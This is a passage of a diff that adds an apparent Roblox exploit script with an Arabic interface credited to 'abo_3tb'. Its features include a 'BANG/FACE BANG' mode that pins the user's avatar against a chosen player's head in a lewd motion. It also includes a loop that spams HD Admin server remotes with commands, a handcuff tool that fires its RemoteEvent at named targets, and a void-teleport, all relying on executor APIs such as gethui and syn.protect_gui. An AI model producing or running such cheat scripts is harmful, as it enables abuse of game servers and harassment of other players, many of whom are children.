+        textButton2.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
+    else
+        v29 =  false
+        v49 =  nil
+        f22()
+        textButton2.Text = "BANG"
+        textButton2.BackgroundColor3 = Color3.fromRGB(0, 80, 0)
+    end
+end
+textButton2.MouseButton1Click:Connect(function()
+    f27((tostring(textBox.Text or "")))
+end
+)
+userInputService.InputBegan:Connect(function(input9, p18)
+    if p18 then
+        return
+    end
+    if input9.KeyCode == Enum.KeyCode.E then
+        f27((tostring(textBox.Text or "")))
+    end
+end
+)
+local connect, v50, v51
+local function f28()
+    v34 =  false
+    if connect then
+        connect:Disconnect()
+        connect =  nil
+    end
+    if v50 then
+        v50:Disconnect()
+        v50 =  nil
+    end
+    if v51 then
+        v51:Disconnect()
+        v51 =  nil
+    end
+    textButton3.Text = "FACE BANG"
+    textButton3.BackgroundColor3 = Color3.fromRGB(0, 80, 0)
+end
+local v52, name2
+local function f29(p19)
+    if not p19 then
+        return
+    end
+    f28()
+    v34 =  true
+    v52 = p19
+    name2 = p19.Name
+    local f30
+    function f30()
+        if not v52 or not v52.Parent or not v52.Character then
+            return
+        else
+            local character2 = localPlayer.Character
+            if not character2 then
+                return
+            else
+                local humanoid2 = character2:FindFirstChildOfClass("Humanoid")
+                if humanoid2 and humanoid2.Health > 0 then
+                    humanoid2.Sit =  true
+                end
+                return
+            end
+        end
+    end
+    connect = runService.Heartbeat:Connect(function()
+        if not v34 then
+            return
+        end
+        if not v52 or not v52.Parent or not v52.Character then
+            if name2 then
+                local v53 = f11(name2)
+                if v53 and v53.Parent and v53.Character then
+                    v52 = v53
+                end
+            end
+            return
+        else
+            f30()
+            local character3 = v52.Character
+            local v54 =  not character3
+            local character4 = localPlayer.Character
+            if v54 or not character4 then
+                return
+            else
+                local head = character3:FindFirstChild("Head")
+                local humanoidRootPart4 = character4:FindFirstChild("HumanoidRootPart")
+                if head and humanoidRootPart4 then
+                    local v55 = tick()
+                    local v56 = math.sin(v55 * 8)
+                    humanoidRootPart4.CFrame = CFrame.new(head.Position + head.CFrame.LookVector *(1.2 + v56 * 1.25), head.Position)
+                end
+                return
+            end
+        end
+    end
+)
+    textButton3.Text = "UNFACE BANG"
+    textButton3.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
+end
+textButton3.MouseButton1Click:Connect(function()
+    local v57 = tostring(textBox.Text or "")
+    if # v57 < 2 then
+        return
+    else
+        local v58 = f11(v57)
+        if v58 then
+            if v34 then
+                f28()
+            else
+                f29(v58)
+            end
+        end
+        return
+    end
+end
+)
+spawn(function()
+    while v30 do
+        if v29 and v49 and v49 ~= "" then
+            local v59 = f11(v49)
+            if v59 and v59.Character and localPlayer.Character then
+                local humanoidRootPart5 = localPlayer.Character:FindFirstChild("HumanoidRootPart")
+                local humanoidRootPart6 = v59.Character:FindFirstChild("HumanoidRootPart")
+                if humanoidRootPart5 and humanoidRootPart6 then
+                    if not v28 then
+                        pcall(f21, v59)
+                    elseif not(humanoidRootPart5:FindFirstChild("BANGAttachment") and humanoidRootPart6:FindFirstChild("BANGTargetAttachment")) then
+                        v28 =  false
+                        pcall(f21, v59)
+                    end
+                elseif v28 then
+                    f22()
+                end
+            elseif v28 then
+                f22()
+            end
+        elseif v28 then
+            f22()
+        end
+        task.wait(0.12)
+    end
+end
+)
+players.PlayerRemoving:Connect(function(player)
+    if player.Name == v49 then
+        if v28 then
+            f22()
+        end
+    end
+end
+)
+local function f31(p20)
+    if not p20 then
+        return
+    else
+        local humanoid3 = p20:FindFirstChildOfClass("Humanoid")
+        if humanoid3 then
+            humanoid3.Died:Connect(function()
+                v28 =  false
+                f22()
+            end
+)
+        end
+        return
+    end
+end
+if localPlayer.Character then
+    f31(localPlayer.Character)
+end
+localPlayer.CharacterAdded:Connect(function(character5)
+    f31(character5)
+    task.wait(0.05)
+end
+)
+frame5.AncestryChanged:Connect(function()
+    if not frame5:IsDescendantOf(game) then
+        v30 =  false
+        v29 =  false
+        v49 =  nil
+        f22()
+    end
+end
+)
+v14:ClearAllChildren()
+local frame7 = Instance.new("Frame")
+frame7.Size = UDim2.new(1,  - 10, 0, 120)
+frame7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame7.Active =  true
+frame7.Draggable =  false
+frame7.ZIndex = 1002
+frame7.LayoutOrder = 1
+frame7.Parent = v14
+local uiCorner11 = Instance.new("UICorner")
+uiCorner11.CornerRadius = UDim.new(0, 10)
+uiCorner11.Parent = frame7
+local uiStroke6 = Instance.new("UIStroke")
+uiStroke6.Thickness = 2
+uiStroke6.Color = Color3.fromRGB(60, 0, 0)
+uiStroke6.Parent = frame7
+local textLabel6 = Instance.new("TextLabel")
+textLabel6.Text = "حمايه نسخ"
+textLabel6.Size = UDim2.new(1, 0, 0, 20)
+textLabel6.Position = UDim2.new(0, 0, 0, 0)
+textLabel6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+textLabel6.TextColor3 = Color3.fromRGB(139, 0, 0)
+textLabel6.Font = Enum.Font.GothamBold
+textLabel6.TextSize = 14
+textLabel6.ZIndex = 1003
+textLabel6.Parent = frame7
+local uiCorner12 = Instance.new("UICorner")
+uiCorner12.CornerRadius = UDim.new(0, 10)
+uiCorner12.Parent = textLabel6
+local textButton4 = Instance.new("TextButton")
+textButton4.Size = UDim2.new(1,  - 10, 0, 40)
+textButton4.Position = UDim2.new(0, 5, 0, 28)
+textButton4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+textButton4.TextColor3 = Color3.fromRGB(139, 0, 0)
+textButton4.Font = Enum.Font.GothamBold
+textButton4.TextSize = 16
+textButton4.Text = "تشغيل"
+textButton4.ZIndex = 1003
+textButton4.Parent = frame7
+local uiCorner13 = Instance.new("UICorner")
+uiCorner13.CornerRadius = UDim.new(0, 8)
+uiCorner13.Parent = textButton4
+local f32, v60
+local function f33()
+    while v60 do
+        f32(";char me 4yb_v")
+        task.wait(1)
+        f32(";char me s56_v")
+        task.wait(1)
+        f32(";unemote")
+        task.wait(1)
+    end
+end
+function f32(p21)
+    local hdAdminHDClient = replicatedStorage:FindFirstChild("HDAdminHDClient")
+    if hdAdminHDClient and hdAdminHDClient:FindFirstChild("Signals") and hdAdminHDClient.Signals:FindFirstChild("RequestCommandSilent") then
+        pcall(function()
+            hdAdminHDClient.Signals.RequestCommandSilent:InvokeServer(p21)
+        end
+)
+        return
+    end
+    local events = replicatedStorage:FindFirstChild("Events")
+    if events and events:FindFirstChild("SendMessage") then
+        pcall(function()
+            events.SendMessage:FireServer(p21)
+        end
+)
+    end
+end
+v60 =  false
+textButton4.MouseButton1Click:Connect(function()
+    v60 =  not v60
+    if v60 then
+        textButton4.Text = "إيقاف"
+        textButton4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        textButton4.TextColor3 = Color3.fromRGB(139, 0, 0)
+        task.spawn(f33)
+    else
+        textButton4.Text = "تشغيل"
+        textButton4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        textButton4.TextColor3 = Color3.fromRGB(139, 0, 0)
+    end
+end
+)
+local textButton5 = Instance.new("TextButton")
+textButton5.Size = UDim2.new(1,  - 10, 0, 28)
+textButton5.Position = UDim2.new(0, 5, 0, 74)
+textButton5.Text = "نسخ"
+textButton5.Font = Enum.Font.GothamBold
+textButton5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+textButton5.TextColor3 = Color3.fromRGB(139, 0, 0)
+textButton5.ZIndex = 1003
+textButton5.Parent = frame7
+local v61
+local function f34()
+    for key6, value15 in pairs(v61) do
+        local v62 = value15
+        pcall(function()
+            v62:Disconnect()
+        end
+)
+    end
+    v61 = {
+    }
+end
+local uiCorner14 = Instance.new("UICorner")
+uiCorner14.CornerRadius = UDim.new(0, 6)
+uiCorner14.Parent = textButton5
+textButton5.MouseButton1Click:Connect(function()
+    pcall(function()
+        local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+
+-- إنشاء الواجهة
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "CommandGUI"
+ScreenGui.ResetOnSpawn = false
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 180, 0, 130)
+Frame.Position = UDim2.new(0, 10, 0, 10)
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- أسود
+Frame.Active = true
+Frame.Draggable = true
+Frame.Parent = ScreenGui
+Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 6)
+
+local Title = Instance.new("TextLabel")
+Title.Text = "سكربت نسخ مطور توريب"
+Title.Size = UDim2.new(1, 0, 0, 18)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20) -- رمادي غامق
+Title.TextColor3 = Color3.fromRGB(150, 0, 0) -- أحمر غامق
+Title.Font = Enum.Font.SourceSansBold
+Title.TextSize = 11
+Title.Parent = Frame
+Instance.new("UICorner", Title).CornerRadius = UDim.new(0, 6)
+
+local TextBox = Instance.new("TextBox")
+TextBox.Size = UDim2.new(1, -10, 0, 18)
+TextBox.Position = UDim2.new(0, 5, 0, 22)
+TextBox.PlaceholderText = "الأمر"
+TextBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20) -- رمادي غامق
+TextBox.TextColor3 = Color3.fromRGB(150, 0, 0) -- أحمر غامق
+TextBox.ClearTextOnFocus = true -- النص ينحذف عند الكتابة
+TextBox.Font = Enum.Font.SourceSans
+TextBox.TextSize = 11
+TextBox.Parent = Frame
+Instance.new("UICorner", TextBox).CornerRadius = UDim.new(0, 4)
+
+local SpeedBox = Instance.new("TextBox")
+SpeedBox.Size = UDim2.new(1, -10, 0, 18)
+SpeedBox.Position = UDim2.new(0, 5, 0, 44)
+SpeedBox.PlaceholderText = "السرعة (ثانية)"
+SpeedBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20) -- رمادي غامق
+SpeedBox.TextColor3 = Color3.fromRGB(150, 0, 0) -- أحمر غامق
+SpeedBox.Text = "1"
+SpeedBox.ClearTextOnFocus = true -- النص ينحذف عند الكتابة
+SpeedBox.Font = Enum.Font.SourceSans
+SpeedBox.TextSize = 11
+SpeedBox.Parent = Frame
+Instance.new("UICorner", SpeedBox).CornerRadius = UDim.new(0, 4)
+
+local StartButton = Instance.new("TextButton")
+StartButton.Text = "تشغيل"
+StartButton.Size = UDim2.new(0.48, -5, 0, 22)
+StartButton.Position = UDim2.new(0, 5, 0, 66)
+StartButton.BackgroundColor3 = Color3.fromRGB(0, 80, 0) -- أخضر غامق
+StartButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- أبيض
+StartButton.Font = Enum.Font.SourceSansBold
+StartButton.TextSize = 11
+StartButton.Parent = Frame
+Instance.new("UICorner", StartButton).CornerRadius = UDim.new(0, 5)
+
+local StopButton = Instance.new("TextButton")
+StopButton.Text = "إيقاف"
+StopButton.Size = UDim2.new(0.48, -5, 0, 22)
+StopButton.Position = UDim2.new(0.52, 0, 0, 66)
+StopButton.BackgroundColor3 = Color3.fromRGB(80, 0, 0) -- أحمر غامق
+StopButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- أبيض
+StopButton.Font = Enum.Font.SourceSansBold
+StopButton.TextSize = 11
+StopButton.Parent = Frame
+Instance.new("UICorner", StopButton).CornerRadius = UDim.new(0, 5)
+
+local StatusLabel = Instance.new("TextLabel")
+StatusLabel.Text = "جاهز"
+StatusLabel.Size = UDim2.new(1, -10, 0, 14)
+StatusLabel.Position = UDim2.new(0, 5, 0, 92)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.TextColor3 = Color3.fromRGB(150, 0, 0) -- أحمر غامق
+StatusLabel.Font = Enum.Font.SourceSans
+StatusLabel.TextSize = 9
+StatusLabel.Parent = Frame
+
+-- إظهار الواجهة
+if gethui then
+    ScreenGui.Parent = gethui()
+elseif syn and syn.protect_gui then
+    syn.protect_gui(ScreenGui)
+    ScreenGui.Parent = game.CoreGui
+else
+    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+end
+
+-- المتغيرات
+local isAutoExecuting = false
+local autoExecuteThread = nil
+
+-- دالة تنفيذ الأوامر
+local function executeCommand(command)
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local HDAdminHDClient = ReplicatedStorage:FindFirstChild("HDAdminHDClient")
+    
+    if HDAdminHDClient then
+        local Signals = HDAdminHDClient:FindFirstChild("Signals")
+        if Signals then
+            local RequestCommandSilent = Signals:FindFirstChild("RequestCommandSilent")
+            if RequestCommandSilent then
+                pcall(function()
+                    RequestCommandSilent:InvokeServer(command)
+                end)
+                return true
+            end
+        end
+    end
+    
+    local Events = ReplicatedStorage:FindFirstChild("Events")
+    if Events then
+        local SendMessage = Events:FindFirstChild("SendMessage")
+        if SendMessage then
+            pcall(function()
+                SendMessage:FireServer(command)
+            end)
+            return true
+        end
+    end
+    
+    return false
+end
+
+-- زر التشغيل
+StartButton.MouseButton1Click:Connect(function()
+    local command = TextBox.Text
+    local speed = tonumber(SpeedBox.Text) or 1
+    
+    if command and command ~= "" then
+        if not isAutoExecuting then
+            -- تشغيل التلقائي
+            isAutoExecuting = true
+            StatusLabel.Text = "جاري الإرسال كل " .. speed .. " ثانية"
+            
+            autoExecuteThread = coroutine.wrap(function()
+                while isAutoExecuting do
+                    executeCommand(command)
+                    wait(speed)
+                end
+            end)()
+        end
+    else
+        StatusLabel.Text = "اكتب الأمر"
+        wait(2)
+        StatusLabel.Text = "جاهز"
+    end
+end)
+
+-- زر الإيقاف
+StopButton.MouseButton1Click:Connect(function()
+    if isAutoExecuting then
+        -- إيقاف التلقائي
+        isAutoExecuting = false
+        StatusLabel.Text = "متوقف"
+    end
+end)
+
+-- تنفيذ عند Enter
+TextBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        local command = TextBox.Text
+        if command and command ~= "" then
+            if executeCommand(command) then
+                StatusLabel.Text = "تم الإرسال"
+                wait(1)
+                StatusLabel.Text = "جاهز"
+            end
+        end
+    end
+end)
+
+SpeedBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        local speed = tonumber(SpeedBox.Text)
+        if not speed or speed <= 0 then
+            SpeedBox.Text = "1"
+        end
+    end
+end)
+
+print("✅ سكربت نسخ مطور توريب جاهز")
+    end
+)
+end
+)
+local function f35(p22)
+    if not p22 or not p22.Parent then
+        return
+    else
+        pcall(function()
+            p22:SetStateEnabled(Enum.HumanoidStateType.Seated,  false)
+            p22.Sit =  false
+        end
+)
+        local connect2 = p22:GetPropertyChangedSignal("Sit"):Connect(function()
+            if p22.Sit then
+                pcall(function()
+                    p22.Sit =  false
+                end
+)
+            end
+        end
+)
+        table.insert(v61, connect2)
+        return
+    end
+end
+local v63 = 0
+v61 = {
+}
+local function f36(p23)
+    if not p23 then
+        return nil
+    end
+    for index10, value16 in ipairs({
+        "كلبشه",
+        "كلبشه كاتانا",
+        "كلبشه"
+    }
+) do
+        for index11, value17 in ipairs(p23:GetChildren()) do
+            if value17:IsA("Tool") then
+                if tostring(value17.Name):lower():gsub("^%s*(.-)%s*$", "%1") == value16:lower():gsub("^%s*(.-)%s*$", "%1") then
+                    return value17
+                end
+            end
+            if # value17:GetChildren() > 0 then
+                local v64 = f36(value17)
+                if v64 then
+                    return v64
+                end
+            end
+        end
+    end
+    return nil
+end
+local function f37(p24)
+    if not p24 then
+        return nil
+    else
+        local v65 = f36(p24)
+        if v65 then
+            return v65
+        elseif p24 == localPlayer.Character then
+            local v66 = f36(localPlayer.Backpack)
+            if v66 then
+                return v66
+            end
+            return nil
+        else
+            return nil
+        end
+    end
+end
+local function f38(p25)
+    f34()
+    if p25 and p25.Character then
+        local humanoid4 = p25.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid4 then
+            f35(humanoid4)
+        end
+    end
+    print("تم تحديد الهدف:", p25.Name)
+end
+local function f39(p26, p27)
+    if not p26 then
+        return false
+    end
+    local character6 = p26.Character
+    if not character6 then
+        return false
+    end
+    if not p27 and tick() - v63 < 0.01 then
+        return false
+    end
+    local v67 = f37(localPlayer.Character)
+    if not v67 then
+        warn("لا توجد أدوات كلبشه (كلبشه أو كلبشه كاتانا) في حقيبتك أو بيدك.")
+        return false
+    end
+    local remoteEvent = v67:FindFirstChildWhichIsA("RemoteEvent")
+    if not remoteEvent then
+        warn("الأداة '"..tostring(v67.Name).. "' لا تحتوي RemoteEvent. لن يتم استخدامها.")
+        return false
+    end
+    print("تم اختيار أداة: "..v67.Name.. " للكلبشة")
+    local parent = v67.Parent
+    pcall(function()
+        v67.Parent = localPlayer.Character
+    end
+)
+    task.wait(0.05)
+    if not pcall(function()
+        remoteEvent:FireServer(character6)
+    end
+) then
+        task.wait(0.2)
+        pcall(function()
+            remoteEvent:FireServer(character6)
+        end
+)
+    end
+    task.wait(0.05)
+    pcall(function()
+        if v67 and v67.Parent then
+            v67.Parent = parent or localPlayer.Backpack
+        end
+    end
+)
+    v63 = tick()
+    print("تم محاولة كلبشة اللاعب:", p26.Name, "باستخدام", v67.Name)
+    return true
+end
+local frame8 = Instance.new("Frame")
+frame8.Size = UDim2.new(1,  - 10, 0, 150)
+frame8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame8.BorderSizePixel = 0
+frame8.LayoutOrder = 1
+frame8.ZIndex = 1002
+frame8.Parent = v15
+local uiCorner15 = Instance.new("UICorner")
+uiCorner15.CornerRadius = UDim.new(0, 10)
+uiCorner15.Parent = frame8
+local uiStroke7 = Instance.new("UIStroke")
+uiStroke7.Thickness = 2
+uiStroke7.Color = Color3.fromRGB(60, 0, 0)
+uiStroke7.Parent = frame8
+local textLabel7 = Instance.new("TextLabel")
+textLabel7.Text = "الكلبشه"
+textLabel7.Size = UDim2.new(0.3, 0, 0, 20)
+textLabel7.Position = UDim2.new(0.65, 0, 0, 6)
+textLabel7.BackgroundTransparency = 1
+textLabel7.TextColor3 = Color3.fromRGB(139, 0, 0)
+textLabel7.Font = Enum.Font.GothamBold
+textLabel7.TextScaled =  true
+textLabel7.TextXAlignment = Enum.TextXAlignment.Right
+textLabel7.ZIndex = 1003
+textLabel7.Parent = frame8
+local textBox2 = Instance.new("TextBox")
+textBox2.PlaceholderText = "اكتب اسم اللاعب - اكتب حرفين للاقتراحات"
+textBox2.Size = UDim2.new(0.65,  - 12, 0, 32)
+textBox2.Position = UDim2.new(0.33, 6, 0, 30)
+textBox2.TextColor3 = Color3.fromRGB(139, 0, 0)
+textBox2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+textBox2.ClearTextOnFocus =  true
+textBox2.Font = Enum.Font.Gotham
+textBox2.TextSize = 14
+textBox2.TextXAlignment = Enum.TextXAlignment.Right
+textBox2.ZIndex = 1003
+textBox2.Parent = frame8
+local uiCorner16 = Instance.new("UICorner")
+uiCorner16.CornerRadius = UDim.new(0, 6)
+uiCorner16.Parent = textBox2
+local textButton6 = Instance.new("TextButton")
+textButton6.Text = "كلبشه"
+textButton6.Size = UDim2.new(0.3,  - 8, 0, 28)
+textButton6.Position = UDim2.new(0.65, 6, 0, 68)
+textButton6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+textButton6.TextColor3 = Color3.fromRGB(139, 0, 0)
+textButton6.Font = Enum.Font.GothamBold
+textButton6.TextScaled =  true
+textButton6.ZIndex = 1003
+textButton6.Parent = frame8
+local uiCorner17 = Instance.new("UICorner")
+uiCorner17.CornerRadius = UDim.new(0, 6)
+local clearAllChildren = v16.ClearAllChildren
+uiCorner17.Parent = textButton6
+textBox2:GetPropertyChangedSignal("Text"):Connect(function()
+    local v68 = tostring(textBox2.Text or "")
+    if # v68 < 2 then
+        for index12, value18 in ipairs(frame8:GetChildren()) do
+            if value18.Name == "AutoCompleteItem" then
+                value18:Destroy()
+            end
+        end
+        return
+    else
+        local v69 = {
+        }
+        local lower = v68:lower()
+        for key7, value19 in pairs(players:GetPlayers()) do
+            if value19 ~= localPlayer and value19.Name:lower():find(lower, 1,  true) == 1 then
+                table.insert(v69, value19.Name)
+            end
+        end
+        for index13, value20 in ipairs(frame8:GetChildren()) do
+            if value20.Name == "AutoCompleteItem" then
+                value20:Destroy()
+            end
+        end
+        if # v69 == 0 then
+            return
+        else
+            local v70 = 64
+            for index14, value21 in ipairs(v69) do
+                local text2 = value21
+                if index14 > 5 then
+                    break
+                else
+                    local autoCompleteItem2 = Instance.new("TextButton")
+                    autoCompleteItem2.Name = "AutoCompleteItem"
+                    autoCompleteItem2.Size = UDim2.new(0.65,  - 12, 0, 24)
+                    autoCompleteItem2.Position = UDim2.new(0.33, 6, 0, v70)
+                    autoCompleteItem2.Text = text2
+                    autoCompleteItem2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                    autoCompleteItem2.TextColor3 = Color3.fromRGB(139, 0, 0)
+                    autoCompleteItem2.Font = Enum.Font.GothamBold
+                    autoCompleteItem2.TextSize = 12
+                    autoCompleteItem2.TextXAlignment = Enum.TextXAlignment.Right
+                    autoCompleteItem2.ZIndex = 1004
+                    autoCompleteItem2.Parent = frame8
+                    local uiCorner18 = Instance.new("UICorner")
+                    uiCorner18.CornerRadius = UDim.new(0, 4)
+                    uiCorner18.Parent = autoCompleteItem2
+                    autoCompleteItem2.MouseButton1Click:Connect(function()
+                        textBox2.Text = text2
+                        for index15, value22 in ipairs(frame8:GetChildren()) do
+                            if value22.Name == "AutoCompleteItem" then
+                                value22:Destroy()
+                            end
+                        end
+                    end
+)
+                    v70 = v70 + 26
+                end
+            end
+            return
+        end
+    end
+end
+)
+textButton6.MouseButton1Click:Connect(function()
+    local gsub = textBox2.Text:gsub("^%s*(.-)%s*$", "%1")
+    if gsub == "" then
+        warn("اكتب اسم اللاعب أولاً")
+        return
+    else
+        local findFirstChild = players:FindFirstChild(gsub)
+        if not findFirstChild then
+            warn("اللاعب غير موجود")
+            return
+        end
+        f38(findFirstChild)
+        if not f39(findFirstChild,  true) then
+            warn("فشل تنفيذ الكلبشة - تأكد أن اللاعب حي وأن لديك إحدى أدوات الكلبشة.")
+        end
+        return
+    end
+end
+)
+clearAllChildren(v16)
+local frame9 = Instance.new("Frame")
+frame9.Size = UDim2.new(1,  - 10, 0, 120)
+frame9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame9.BorderSizePixel = 0
+frame9.LayoutOrder = 1
+frame9.ZIndex = 1002
+frame9.Parent = v16
+local uiCorner19 = Instance.new("UICorner")
+uiCorner19.CornerRadius = UDim.new(0, 10)
+uiCorner19.Parent = frame9
+local uiStroke8 = Instance.new("UIStroke")
+uiStroke8.Thickness = 2
+uiStroke8.Color = Color3.fromRGB(60, 0, 0)
+uiStroke8.Parent = frame9
+local textButton7 = Instance.new("TextButton")
+textButton7.Size = UDim2.new(1,  - 20, 0, 60)
+textButton7.Position = UDim2.new(0, 10, 0, 10)
+textButton7.Text = "حماية تعليق"
+textButton7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+textButton7.TextColor3 = Color3.fromRGB(139, 0, 0)
+textButton7.TextSize = 16
+textButton7.Font = Enum.Font.GothamBold
+textButton7.Parent = frame9
+local uiCorner20 = Instance.new("UICorner")
+uiCorner20.CornerRadius = UDim.new(0, 8)
+uiCorner20.Parent = textButton7
+local textLabel8 = Instance.new("TextLabel")
+textLabel8.Size = UDim2.new(1, 0, 0, 20)
+textLabel8.Position = UDim2.new(0, 0, 0, 80)
+textLabel8.Text = "by abo_3tb"
+textLabel8.BackgroundTransparency = 1
+textLabel8.TextColor3 = Color3.fromRGB(139, 0, 0)
+textLabel8.TextSize = 12
+textLabel8.Font = Enum.Font.Gotham
+textLabel8.Parent = frame9
+local v71 =  false
+local position, position2
+frame9.InputBegan:Connect(function(input10)
+    if input10.UserInputType == Enum.UserInputType.MouseButton1 then
+        v71 =  true
+        position = input10.Position
+        position2 = frame9.Position
+    end
+end
+)
+frame9.InputEnded:Connect(function(input11)
+    if input11.UserInputType == Enum.UserInputType.MouseButton1 then
+        v71 =  false
+    end
+end
+)
+frame9.InputChanged:Connect(function(input12)
+    if v71 and input12.UserInputType == Enum.UserInputType.MouseMovement then
+        local v72 = input12.Position - position
+        frame9.Position = UDim2.new(position2.X.Scale, position2.X.Offset + v72.X, position2.Y.Scale, position2.Y.Offset + v72.Y)
+    end
+end
+)
+local function f40(p28)
+    if not p28 then
+        return nil
+    else
+        local humanoidRootPart7 = p28:FindFirstChild("HumanoidRootPart")
+        if humanoidRootPart7 then
+            return humanoidRootPart7
+        else
+            local v73, v74 = pcall(function()
+                return p28:WaitForChild("HumanoidRootPart", 2)
+            end
+)
+            if v73 then
+                return v74
+            end
+            return nil
+        end
+    end
+end
+local v75 =  false
+local position3
+textButton7.MouseButton1Click:Connect(function()
+    v75 =  not v75
+    if v75 then
+        local v76 = f40(localPlayer.Character)
+        if v76 then
+            position3 = v76.Position
+        else
+            position3 =  nil
+        end
+        textButton7.Text = "إيقاف حماية"
+        textButton7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        textButton7.TextColor3 = Color3.fromRGB(139, 0, 0)
+    else
+        textButton7.Text = "حماية تعليق"
+        textButton7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        textButton7.TextColor3 = Color3.fromRGB(139, 0, 0)
+        position3 =  nil
+    end
+end
+)
+localPlayer.CharacterAdded:Connect(function(character7)
+    local v77 = v75
+    local v78 = f40(character7)
+    if v77 and v78 then
+        position3 = position3 or v78.Position
+    end
+end
+)
+runService.Heartbeat:Connect(function()
+    if not v75 or not position3 then
+        return
+    end
+    local character8 = localPlayer.Character
+    local v79 = f40(character8)
+    if not v79 then
+        return
+    end
+    pcall(function()
+        local humanoid5
+        if(v79.Position - position3).Magnitude > 10000 then
+            v79.CFrame = CFrame.new(position3)
+            humanoid5 = character8:FindFirstChildOfClass("Humanoid")
+            if humanoid5 then
+                humanoid5.PlatformStand =  true
+                task.delay(2, function()
+                    if character8 and character8.Parent and humanoid5 then
+                        humanoid5.PlatformStand =  false
+                    end
+                end
+)
+            end
+        end
+    end
+)
+end
+)
+v17:ClearAllChildren()
+local frame10 = Instance.new("Frame")
+frame10.Size = UDim2.new(1,  - 10, 0, 120)
+frame10.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame10.BorderSizePixel = 0
+frame10.LayoutOrder = 1
+frame10.ZIndex = 1002
+frame10.Parent = v17
+local uiCorner21 = Instance.new("UICorner")
+uiCorner21.CornerRadius = UDim.new(0, 10)
+uiCorner21.Parent = frame10
+local uiStroke9 = Instance.new("UIStroke")
+uiStroke9.Thickness = 2
+uiStroke9.Color = Color3.fromRGB(60, 0, 0)
+uiStroke9.Parent = frame10
+local textLabel9 = Instance.new("TextLabel")
+textLabel9.Size = UDim2.new(1,  - 10, 0, 20)
+textLabel9.Position = UDim2.new(0, 5, 0, 4)
+textLabel9.BackgroundTransparency = 1
+textLabel9.Text = "Void Teleport"
+textLabel9.TextColor3 = Color3.fromRGB(139, 0, 0)
+textLabel9.Font = Enum.Font.GothamBold
+textLabel9.TextSize = 16
+textLabel9.TextXAlignment = Enum.TextXAlignment.Left
+textLabel9.Parent = frame10
+local textLabel10 = Instance.new("TextLabel")
+textLabel10.Size = UDim2.new(0, 40, 0, 16)
+textLabel10.Position = UDim2.new(1,  - 45, 0, 4)
+textLabel10.BackgroundTransparency = 1
+textLabel10.Text = "OFF"
+textLabel10.TextColor3 = Color3.fromRGB(139, 0, 0)
+textLabel10.Font = Enum.Font.GothamBold
+textLabel10.TextSize = 14
+textLabel10.Parent = frame10
+local textButton8 = Instance.new("TextButton")
+textButton8.Size = UDim2.new(1,  - 10, 0, 32)
+textButton8.Position = UDim2.new(0, 5, 0, 30)
+textButton8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+textButton8.BorderSizePixel = 0
+textButton8.Text = "Activate"
+textButton8.TextColor3 = Color3.fromRGB(139, 0, 0)
+textButton8.Font = Enum.Font.GothamBold
+textButton8.TextSize = 14
+textButton8.Parent = frame10
+local uiCorner22 = Instance.new("UICorner")
+uiCorner22.CornerRadius = UDim.new(0, 6)
+uiCorner22.Parent = textButton8
+local v80 =  false
+local function f41(p29)
+    if p29 then
+        textLabel10.Text = "ON"
+        textLabel10.TextColor3 = Color3.fromRGB(139, 0, 0)
+    else
+        textLabel10.Text = "OFF"
+        textLabel10.TextColor3 = Color3.fromRGB(139, 0, 0)
+    end
+end
+local cframe
+textButton8.MouseButton1Click:Connect(function()
+    local character9 = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+    if not character9 then
+        return
+    end
+    local humanoidRootPart8 = character9:FindFirstChild("HumanoidRootPart")
+    if not humanoidRootPart8 then
+        return
+    elseif v80 then
+        return
+    else
+        cframe = humanoidRootPart8.CFrame
+        local v81, v82 = pcall(function()
+            humanoidRootPart8.CFrame = CFrame.new(9999999999, 999999, humanoidRootPart8.Position.Z)
+        end
+)
+        if not v81 then
+            warn("Teleport failed:", v82)
+            return
+        end
+        v80 =  true
+        f41( true)
+        textButton8.Text = "Returning in "..tostring(3).. "s"
+        textButton8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        textButton8.TextColor3 = Color3.fromRGB(139, 0, 0)
+        task.spawn(function()
+            task.wait(3)
+            local character10 = localPlayer.Character
+            if character10 and character10:FindFirstChild("HumanoidRootPart") and cframe then
+                pcall(function()
+                    character10.HumanoidRootPart.CFrame = cframe
+                end
+)
+            end
+            v80 =  false
+            f41( false)
+            textButton8.Text = "Activate"
+            textButton8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+            textButton8.TextColor3 = Color3.fromRGB(139, 0, 0)
+            cframe =  nil
+        end
+)
+        return
+    end
+end
+)
+print("تم تحميل سكربت ابو عتب")
